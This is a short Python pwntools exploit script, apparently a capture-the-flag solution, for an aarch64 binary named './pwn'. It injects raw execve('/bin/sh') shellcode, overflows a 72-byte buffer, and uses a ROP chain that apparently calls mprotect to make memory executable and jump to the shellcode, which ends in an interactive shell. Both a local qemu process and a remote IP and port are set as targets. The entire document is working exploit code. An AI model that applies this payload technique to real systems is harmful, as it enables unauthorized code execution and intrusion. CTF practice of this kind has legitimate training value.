from pwn import*
context.log_level="debug"
context.binary = "./pwn"

offest=72
debug=1
if debug:
        #p=process(["qemu-aarch64", "-g", "1111","-L","/usr/aarch64-linux-gnu/","./pwn"])
	p=process(["qemu-aarch64","-L","/usr/aarch64-linux-gnu/","./pwn"])
else:
	p=remote("106.75.126.171", 33865)   

#pause()
shellcode="\xee\x45\x8c\xd2\x2e\xcd\xad\xf2\xee\xe5\xc5\xf2\xee\x65\xee\xf2\x0f\x0d\x80\xd2\xee\x3f\xbf\xa9\xe0\x03\x00\x91\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x01\x00\x00\xd4"
#shellcode=asm(shellcraft.aarch64.sh()50
p.sendafter("Name:",p64(0x400600)+p64(0)+shellcode)

pause()

first=0x00000000004008CC
second=0x00000000004008AC
payload="A"*offest
payload+=p64(first)
payload+=p64(0)+p64(second)
payload+=p64(0)+p64(1)
payload+=p64(0x411068)+p64(7)
payload+=p64(0x1000)+p64(0x411000)
payload+=p64(0)+p64(0x411068+16)+p64(0)*6
p.send(payload)

p.interactive()

